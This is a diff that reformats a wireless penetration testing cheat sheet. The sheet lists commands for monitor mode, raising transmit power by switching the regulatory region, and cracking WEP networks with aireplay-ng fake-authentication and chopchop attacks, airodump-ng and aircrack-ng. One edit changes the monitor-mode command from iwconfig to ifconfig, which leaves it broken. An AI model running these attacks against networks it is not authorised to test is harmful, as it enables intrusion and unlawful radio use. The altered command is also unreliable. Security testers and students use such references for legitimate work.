@@ -1,32 +1,35 @@
 # Wireless Penetration Testing Cheat Sheet
 
-##WIRELESS ANTENNA
+## WIRELESS ANTENNA
 
 - Open the Monitor Mode
 
 ```
-root@uceka:~# ifconfig wlan0mon down
-root@uceka:~# iwconfig wlan0mon mode monitor
-root@uceka:~# ifconfig wlan0mon up
+ifconfig wlan0mon down
+ifconfig wlan0mon mode monitor
+ifconfig wlan0mon up
 ```
 
 - Increase Wi-Fi TX Power
 
 ```
-root@uceka:~# iw reg set B0
-root@uceka:~# iwconfig wlan0 txpower <NmW|NdBm|off|auto>
-#txpower is 30 (generally)
-#txpower is depends your country, please googling
-root@uceka:~# iwconfig
+iw reg set B0
+iwconfig wlan0 txpower <NmW|NdBm|off|auto>
+```
+txpower is 30 (generally)
+
+txpower can vary country to country. Please google for yours
+```
+iwconfig
 ```
 
 - Change WiFi Channel
 
 ```
-root@uceka:~# iwconfig wlan0 channel <SetChannel(1-14)>
+iwconfig wlan0 channel <SetChannel(1-14)>
 ```
 
-##WEP CRACKING
+## WEP CRACKING
 
 - Method 1 : Fake Authentication Attack
 
@@ -56,7 +59,8 @@ root@uceka:~# aircrack-ng –b <BSSID> <PCAP_of_FileName>
 ```
 root@uceka:~# airmon-ng start wlan0
 root@uceka:~# airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
-#What’s my mac?
+
+# What’s my mac?
 root@uceka:~# macchanger --show wlan0mon
 root@uceka:~# aireplay-ng -1 0 –e <ESSID> -a <BSSID> -h <OurMac> wlan0mon
 root@uceka:~# aireplay-ng -4 –b <BSSID> -h <OurMac> wlan0mon
